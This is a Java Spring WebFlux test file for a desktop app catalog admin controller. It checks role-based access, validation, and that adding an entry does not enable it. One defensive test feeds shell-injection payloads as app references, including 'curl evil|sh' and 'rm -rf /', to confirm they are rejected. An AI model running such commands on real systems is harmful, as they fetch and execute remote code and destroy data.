package net.hugmesh.adminbff.desktop;
import org.junit.jupiter.api.BeforeEach;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.ApplicationContext;
import org.springframework.boot.webflux.test.autoconfigure.WebFluxTest;
import org.springframework.context.annotation.Import;
import org.springframework.http.MediaType;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.oauth2.jwt.ReactiveJwtDecoder;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.reactive.server.WebTestClient;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;
import net.hugmesh.adminbff.config.SecurityConfig;
import net.hugmesh.commons.security.DomainRegistry;
import net.hugmesh.commons.security.PrincipalDomain;
import net.hugmesh.adminbff.web.ApiExceptionHandler;
import net.hugmesh.adminbff.web.ValidationExceptionHandler;

import java.time.Instant;

import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyBoolean;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;
import static org.springframework.security.test.web.reactive.server.SecurityMockServerConfigurers.mockJwt;
import static org.springframework.security.test.web.reactive.server.SecurityMockServerConfigurers.springSecurity;

/**
 * The DESKTOP CATALOG curation controller role matrix — ADMIN/SUPERADMIN ALLOW, MOD/USER
 * DENY, and the add!=enable contract (add returns a DISABLED row; a separate enable flips
 * it). Mirrors {@code DeviceLicenseControllerTest}.
 */
@WebFluxTest(controllers = DesktopCatalogAdminController.class)
@Import({SecurityConfig.class, DomainRegistry.class, ValidationExceptionHandler.class, ApiExceptionHandler.class})
class DesktopCatalogAdminControllerTest {

    @Autowired ApplicationContext context;

    WebTestClient web;

    @BeforeEach
    void setUpWebTestClient() {
        web = WebTestClient.bindToApplicationContext(context).apply(springSecurity()).build();
    }

    @MockitoBean DesktopAppCatalogService service;
    @MockitoBean ReactiveJwtDecoder jwtDecoder;
    @MockitoBean net.hugmesh.authcore.provision.GatewayRevocationClient revocations;

    private WebTestClient asAdmin() {
        return web.mutateWith(mockJwt().authorities(
                new SimpleGrantedAuthority("ROLE_USER"), new SimpleGrantedAuthority("ROLE_ADMIN")));
    }

    private WebTestClient asSuperadmin() {
        return web.mutateWith(mockJwt().authorities(
                new SimpleGrantedAuthority("ROLE_USER"), new SimpleGrantedAuthority("ROLE_SUPERADMIN")));
    }

    private WebTestClient asMod() {
        return web.mutateWith(mockJwt().authorities(
                new SimpleGrantedAuthority("ROLE_USER"), new SimpleGrantedAuthority("ROLE_MOD")));
    }

    private WebTestClient asUser() {
        return web.mutateWith(mockJwt().authorities(new SimpleGrantedAuthority("ROLE_USER")));
    }

    private static DesktopAppCatalogEntry disabled() {
        return new DesktopAppCatalogEntry("c1", "org.x.app", "X", "FLATPAK", false, "admin",
                "default", Instant.now(), null);
    }

    private static final String ADD_BODY =
            "{\"appRef\":\"org.x.app\",\"displayName\":\"X\",\"source\":\"FLATPAK\"}";

    // ── ADMIN / SUPERADMIN ALLOW ─────────────────────────────────────────────────

    @Test
    void list_asAdmin_isAllowed() {
        when(service.list(any(PrincipalDomain.class))).thenReturn(Flux.just(disabled()));
        asAdmin().get().uri("/bff/admin/desktop/catalog").exchange().expectStatus().isOk()
                .expectBody().jsonPath("$[0].appRef").isEqualTo("org.x.app");
    }

    @Test
    void add_asAdmin_returnsDisabledRow_addIsNotEnable() {
        when(service.add(anyString(), eq("org.x.app"), eq("X"), eq("FLATPAK"), anyString()))
                .thenReturn(Mono.just(disabled()));
        asAdmin().post().uri("/bff/admin/desktop/catalog")
                .contentType(MediaType.APPLICATION_JSON).bodyValue(ADD_BODY)
                .exchange().expectStatus().isCreated()
                .expectBody().jsonPath("$.enabled").isEqualTo(false);   // add != enable
        verify(service).add(anyString(), eq("org.x.app"), eq("X"), eq("FLATPAK"), anyString());
    }

    @Test
    void enable_asSuperadmin_isAllowed() {
        when(service.setEnabled(eq("c1"), eq(true), any(PrincipalDomain.class))).thenReturn(Mono.just(1L));
        asSuperadmin().post().uri("/bff/admin/desktop/catalog/c1/enable")
                .exchange().expectStatus().isOk()
                .expectBody().jsonPath("$.enabled").isEqualTo(true);
        verify(service).setEnabled(eq("c1"), eq(true), any(PrincipalDomain.class));
    }

    @Test
    void disable_asAdmin_isAllowed() {
        when(service.setEnabled(eq("c1"), eq(false), any(PrincipalDomain.class))).thenReturn(Mono.just(1L));
        asAdmin().post().uri("/bff/admin/desktop/catalog/c1/disable")
                .exchange().expectStatus().isOk()
                .expectBody().jsonPath("$.enabled").isEqualTo(false);
    }

    @Test
    void remove_asAdmin_isAllowed() {
        when(service.remove(eq("c1"), any(PrincipalDomain.class))).thenReturn(Mono.just(1L));
        asAdmin().delete().uri("/bff/admin/desktop/catalog/c1")
                .exchange().expectStatus().isOk()
                .expectBody().jsonPath("$.removed").isEqualTo(1);
    }

    // ── MOD / USER DENY (403) on read AND write ──────────────────────────────────

    @Test
    void list_asMod_isForbidden() {
        asMod().get().uri("/bff/admin/desktop/catalog").exchange().expectStatus().isForbidden();
    }

    @Test
    void list_asUser_isForbidden() {
        asUser().get().uri("/bff/admin/desktop/catalog").exchange().expectStatus().isForbidden();
    }

    @Test
    void add_asUser_isForbidden_andNeverWrites() {
        asUser().post().uri("/bff/admin/desktop/catalog")
                .contentType(MediaType.APPLICATION_JSON).bodyValue(ADD_BODY)
                .exchange().expectStatus().isForbidden();
        verify(service, never()).add(anyString(), anyString(), anyString(), anyString(), anyString());
    }

    @Test
    void enable_asMod_isForbidden_andNeverWrites() {
        asMod().post().uri("/bff/admin/desktop/catalog/c1/enable")
                .exchange().expectStatus().isForbidden();
        verify(service, never()).setEnabled(anyString(), anyBoolean(), any());
    }

    // ── Validation: add with no appRef is 400 ────────────────────────────────────

    @Test
    void add_missingAppRef_isBadRequest_andNeverWrites() {
        asAdmin().post().uri("/bff/admin/desktop/catalog")
                .contentType(MediaType.APPLICATION_JSON)
                .bodyValue("{\"displayName\":\"X\"}")
                .exchange().expectStatus().isBadRequest();
        verify(service, never()).add(anyString(), anyString(), anyString(), anyString(), anyString());
    }

    // ── SECURITY: appRef charset @Pattern (shell-injection defence-in-depth) ──────
    // appRef is spliced into a remote-shell install command (RestDesktopSshClient →
    // session.exec); an appRef carrying shell metacharacters must be rejected at the
    // edge (400) so it can never reach the SSH command — and must NEVER be persisted.

    @Test
    void add_appRefWithShellMetacharacters_isBadRequest_andNeverWrites() {
        // ';', '|', space, '$(...)', backtick — classic command-injection payloads.
        for (String evil : new String[] {
                "org.x.app; curl evil|sh",
                "org.x.app$(id)",
                "org.x.app`id`",
                "org.x.app && rm -rf /",
                "org.x.app\nrm -rf /"
        }) {
            asAdmin().post().uri("/bff/admin/desktop/catalog")
                    .contentType(MediaType.APPLICATION_JSON)
                    .bodyValue("{\"appRef\":" + jsonString(evil) + ",\"displayName\":\"X\",\"source\":\"FLATPAK\"}")
                    .exchange().expectStatus().isBadRequest();
        }
        verify(service, never()).add(anyString(), anyString(), anyString(), anyString(), anyString());
    }

    @Test
    void add_legitFlatpakRefWithArchAndBranch_isAllowed() {
        // The pattern must still accept real Flatpak refs (reverse-DNS + /arch/branch)
        // and OCI refs (host/ns/img:tag) — no over-restriction.
        when(service.add(anyString(), eq("org.mozilla.firefox/x86_64/stable"),
                eq("Firefox"), eq("FLATPAK"), anyString())).thenReturn(Mono.just(disabled()));
        asAdmin().post().uri("/bff/admin/desktop/catalog")
                .contentType(MediaType.APPLICATION_JSON)
                .bodyValue("{\"appRef\":\"org.mozilla.firefox/x86_64/stable\","
                        + "\"displayName\":\"Firefox\",\"source\":\"FLATPAK\"}")
                .exchange().expectStatus().isCreated();
        verify(service).add(anyString(), eq("org.mozilla.firefox/x86_64/stable"),
                eq("Firefox"), eq("FLATPAK"), anyString());
    }

    /** Minimal JSON string-literal encoder for the hostile payloads (handles \\n and quotes). */
    private static String jsonString(String s) {
        StringBuilder b = new StringBuilder("\"");
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"' -> b.append("\\\"");
                case '\\' -> b.append("\\\\");
                case '\n' -> b.append("\\n");
                case '\r' -> b.append("\\r");
                case '\t' -> b.append("\\t");
                default -> b.append(c);
            }
        }
        return b.append("\"").toString();
    }
}
